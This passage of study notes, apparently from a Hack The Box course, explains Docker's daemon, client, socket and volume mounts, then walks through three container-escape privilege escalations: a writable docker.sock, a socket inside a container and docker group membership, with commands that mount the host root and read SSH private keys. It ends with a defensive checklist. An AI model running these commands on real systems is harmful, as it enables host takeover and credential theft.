## 2. Docker Daemon

The daemon is the **engine/powerhouse** of Docker. It runs in the background and handles everything.

### Responsibilities:

```
Docker Daemon
│
├── Container Management
│     ├── Create containers
│     ├── Run containers
│     ├── Stop/Kill containers
│     └── Monitor containers
│
├── Image Management
│     ├── Pull from Docker Hub
│     ├── Store images locally
│     └── Build from Dockerfile
│
├── Networking
│     ├── Create virtual networks
│     ├── Assign IP addresses
│     ├── DNS resolution
│     └── Manage ports
│
├── Storage
│     ├── Manage Docker volumes
│     ├── Attach/detach volumes
│     └── Clean up unused volumes
│
└── Logging & Monitoring
      ├── Capture container logs
      ├── Monitor CPU usage
      ├── Monitor memory usage
      └── Monitor network usage
```

## 3. Docker Client

The client is your **interface** — you type commands, it sends them to the daemon.

### How client communicates with daemon:

```
You type:  docker ps
               │
               ▼
    Docker Client converts to:
    GET http://localhost/containers/json
               │
               ▼ (via Unix socket or TCP)
    Docker Daemon receives request
               │
               ▼
    Daemon processes and returns list of containers
               │
               ▼
    Client displays result to you
```

### Common Docker Client Commands:

```bash
# List running containers
docker ps

# List ALL containers (including stopped)
docker ps -a

# Pull an image from Docker Hub
docker pull ubuntu

# Run a container
docker run ubuntu

# Run container interactively with terminal
docker run -it ubuntu bash

# Stop a container
docker stop <container_id>

# Remove a container
docker rm <container_id>

# List all images
docker image ls

# Remove an image
docker rmi <image_id>
```

## 4. Docker Images vs Containers

### Visual Difference:

```
Dockerfile (instructions)
        │
        ▼ docker build
    Docker Image  ◄── Read-only blueprint
        │
        ├──▶ Container 1 (running instance)
        ├──▶ Container 2 (running instance)
        └──▶ Container 3 (running instance)

One image → Many containers
```

### Dockerfile Example:

```dockerfile
# Start from base Ubuntu image
FROM ubuntu:20.04

# Run commands to install dependencies
RUN apt-get update && apt-get install -y python3

# Copy your app code into image
COPY app.py /app/app.py

# Set working directory
WORKDIR /app

# Command to run when container starts
CMD ["python3", "app.py"]
```

### Building and Running:

```bash
# Build image from Dockerfile
docker build -t my_app .

# Run a container from that image
docker run my_app

# Run interactively
docker run -it my_app bash

# Container has its own:
# - Filesystem  (isolated from host)
# - Processes   (isolated from host)
# - Network     (isolated from host)
```

## 5. Docker Socket — Detailed Explanation

### What is the socket file?

```
/var/run/docker.sock
       │
       │  This is a special file (not a regular file)
       │  Type: Unix Domain Socket
       │
       ├── Docker Client writes commands here
       └── Docker Daemon reads and executes them
```

### Talking to Docker via Socket directly (curl):

```bash
# Instead of: docker ps
# You can do:
curl --unix-socket /var/run/docker.sock http://localhost/containers/json

# Instead of: docker images
curl --unix-socket /var/run/docker.sock http://localhost/images/json

# This proves the socket is just a REST API endpoint
```

### Socket file permissions:

```bash
ls -la /var/run/docker.sock

# Output:
srw-rw---- 1 root docker 0 Jun 30 15:27 /var/run/docker.sock
│              │    │
│              │    └── docker group can read/write
│              └── root owns it
└── 's' means it's a socket file (not regular file)
```

### From the document — finding docker socket inside container:

```bash
# After getting into a container, look for socket
htb-student@container:~/app$ ls -al

total 8
drwxr-xr-x 1 htb-student htb-student 4096 Jun 30 15:12 .
drwxr-xr-x 1 root        root        4096 Jun 30 15:12 ..
srw-rw---- 1 root        root           0 Jun 30 15:27 docker.sock
# ▲
# 's' confirms this is a socket file
# Found inside /app directory instead of default /var/run/
```

## 6. Shared Directories (Volume Mounts)

### How volumes work:

```
HOST MACHINE                    DOCKER CONTAINER
─────────────                   ────────────────
/home/user/data    ◄──────────▶  /data
/var/logs          ◄──────────▶  /app/logs
/etc/config        ◄──────────▶  /config  (read-only)

Changes on either side are instantly reflected on the other side
```

### Volume mount commands:

```bash
# Basic volume mount
# -v host_path:container_path
docker run -v /home/user/data:/data ubuntu

# Read-only mount (container cannot modify host files)
docker run -v /etc/config:/config:ro ubuntu

# Mount entire host root (DANGEROUS - used in attacks)
docker run -v /:/hostsystem ubuntu

# Named volume (Docker manages the storage location)
docker run -v myvolume:/data ubuntu
```

### From the document — attacker finds SSH key via shared directory:

```bash
# Attacker is inside a container
# Host's /home directory was mounted into container at /hostsystem

root@container:~$ cd /hostsystem/home/cry0l1t3
# Navigated to victim's home dir via mount

root@container:/hostsystem/home/cry0l1t3$ ls -l
-rw-------  1 cry0l1t3 cry0l1t3  12559 Jun 30 15:09 .bash_history
-rw-r--r--  1 cry0l1t3 cry0l1t3    220 Jun 30 15:09 .bash_logout
-rw-r--r--  1 cry0l1t3 cry0l1t3   3771 Jun 30 15:09 .bashrc
drwxr-x--- 10 cry0l1t3 cry0l1t3   4096 Jun 30 15:09 .ssh
# .ssh folder found! Contains private keys

root@container:/hostsystem/home/cry0l1t3$ cat .ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
<SNIP>
# Private SSH key exposed!

# Now attacker copies it and logs into host directly
s0nam@htb[/htb]$ ssh cry0l1t3@<host IP> -i cry0l1t3.priv
# Successfully logged into the HOST machine as cry0l1t3
```

**Why this works:**

```
Container (attacker) ──reads──▶ /hostsystem/home/cry0l1t3/.ssh/id_rsa
                                         │
                                         │ same file because of volume mount
                                         ▼
Host Machine ──────────────────▶ /home/cry0l1t3/.ssh/id_rsa
```

## 7. Docker Privilege Escalation — All 3 Methods

---

### Method 1: Writable Docker Socket

```bash
# Check if docker socket is writable
docker-user@nix02:~$ ls -la /var/run/docker.sock
srw-rw---- 1 root docker 0 ... docker.sock
# If current user can write to this ↑

# Run a new container that mounts host root (/)
# into /mnt inside the container
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash

# Breaking down this command:
# docker                          → docker client
# -H unix:///var/run/docker.sock  → connect via this socket
# run                             → create and start container
# -v /:/mnt                       → mount HOST's / into container's /mnt
# --rm                            → delete container when done
# -it                             → interactive terminal
# ubuntu                          → use ubuntu image
# chroot /mnt bash                → change root to /mnt (host filesystem!)
#                                   and open bash

# Result: you are now root on HOST filesystem
root@ubuntu:~# ls -l
# You see the HOST's entire filesystem:
total 68
lrwxrwxrwx 1 root root  7  bin -> usr/bin
drwxr-xr-x 4 root root  4096  boot
drwxr-xr-x 2 root root  4096  cdrom
drwxr-xr-x 19 root root 3940  dev
drwxr-xr-x 100 root root 4096 etc      ← host's /etc
drwxr-xr-x 3 root root  4096  home     ← host's /home
...
drwx------ 6 root root  4096  root     ← host's /root !!!
```

---

### Method 2: Exploiting Socket Inside Container

```bash
# Step 1: You're inside a container, find the socket
htb-student@container:~/app$ ls -al
srw-rw---- 1 root root 0 Jun 30 15:27 docker.sock
# Socket is here at /app/docker.sock (non-standard location)

# Step 2: Docker binary not installed? Download it
htb-student@container:/tmp$ wget https://<parrot-os>:443/docker -O docker
# Downloads docker binary from attacker's machine

htb-student@container:/tmp$ chmod +x docker
# Makes it executable

htb-student@container:/tmp$ ls -l
-rwxr-xr-x 1 htb-student htb-student 0 Jun 30 15:27 docker
# Now docker binary is ready

# Step 3: Use the socket to list running containers
htb-student@container:~/tmp$ /tmp/docker -H unix:///app/docker.sock ps

CONTAINER ID     IMAGE         COMMAND                 CREATED
3fe8a4782311     main_app      "/docker-entry.s..."    3 days ago
# Found container using image: main_app
# We'll reuse this image name

# Step 4: Launch a NEW privileged container
# that mounts host root into /hostsystem
htb-student@container:/app$ /tmp/docker -H unix:///app/docker.sock \
  run --rm -d --privileged -v /:/hostsystem main_app

# Breaking down:
# run           → create new container
# --rm          → auto-remove when done
# -d            → run in background (detached)
# --privileged  → give ALL host capabilities to container
# -v /:/hostsystem → mount host's / into /hostsystem
# main_app      → use the existing image we found

# Step 5: Check new container was created
htb-student@container:/app$ /tmp/docker -H unix:///app/docker.sock ps

CONTAINER ID     IMAGE      CREATED
7ae3bcc818af     main_app   12 seconds ago   ← NEW container
3fe8a4782311     main_app   3 days ago       ← original container

# Step 6: Enter the new privileged container
htb-student@container:/app$ /tmp/docker -H unix:///app/docker.sock \
  exec -it 7ae3bcc818af /bin/bash

# exec    → execute command in running container
# -it     → interactive terminal
# 7ae3... → container ID from step 5
# /bin/bash → open bash shell

# Step 7: Read root's SSH key from host
root@7ae3bcc818af:~# cat /hostsystem/root/.ssh/id_rsa

-----BEGIN RSA PRIVATE KEY-----
<SNIP>
# Got ROOT's private key!
# Can now SSH into host as root
```

### Full Attack Flow Diagram:

```
[Inside Container A]
       │
       ├── Found /app/docker.sock
       │
       ├── Downloaded docker binary
       │
       ├── Listed containers → found "main_app" image
       │
       ├── Created Container B (privileged, host / mounted)
       │
       ├── Exec'd into Container B
       │
       └── Read /hostsystem/root/.ssh/id_rsa
                    │
                    ▼
            [SSH into HOST as root]
```

### Method 3: Docker Group Membership

```bash
# Check if current user is in docker group
docker-user@nix02:~$ id

uid=1000(docker-user) gid=1000(docker-user) groups=1000(docker-user),116(docker)
#                                                                          ▲
#                                                              User is in docker group!

# Being in docker group = can run ALL docker commands
# Which means can mount host filesystem and get root

# Same attack as Method 1:
docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash
# Instantly root on host
```

## 8. Docker Compose

```yaml
# docker-compose.yml
version: '3'

services:
  web:                          # Service 1: Web app
    image: nginx
    ports:
      - "80:80"                 # host_port:container_port
    volumes:
      - ./html:/usr/share/nginx/html

  database:                     # Service 2: Database
    image: mysql
    environment:
      MYSQL_ROOT_PASSWORD: secret
    volumes:
      - db_data:/var/lib/mysql

volumes:
  db_data:                      # Named volume for persistence
```

```bash
# Start all services defined in docker-compose.yml
docker compose up

# Start in background
docker compose up -d

# Stop all services
docker compose down

# View logs
docker compose logs
```

## 9. Security Summary

```
RISK LEVEL          SCENARIO                        IMPACT
──────────────────────────────────────────────────────────────
🔴 CRITICAL    Writable docker.sock             Full host root access
🔴 CRITICAL    User in docker group             Full host root access
🔴 CRITICAL    --privileged container           Full host capabilities
🟠 HIGH        Sensitive dirs mounted           Data theft (SSH keys etc)
🟡 MEDIUM      Docker TCP exposed (no TLS)      Remote code execution
🟢 LOW         Read-only volume mounts          Limited info exposure
```

### Defense Checklist:

```bash
# 1. Check who is in docker group (should be minimal)
grep docker /etc/group

# 2. Check socket permissions
ls -la /var/run/docker.sock

# 3. Never run containers with --privileged unless necessary

# 4. Never mount sensitive host dirs into containers

# 5. Never mount / (root) into a container

# 6. Use rootless Docker where possible
```

---

## Key Takeaway

```
Docker Socket  =  Root access to host (if writable)
Docker Group   =  Root access to host
--privileged   =  Root access to host
-v /:/anywhere =  Full host filesystem exposed

The container isolation is only as strong
as the Docker configuration around it.
```
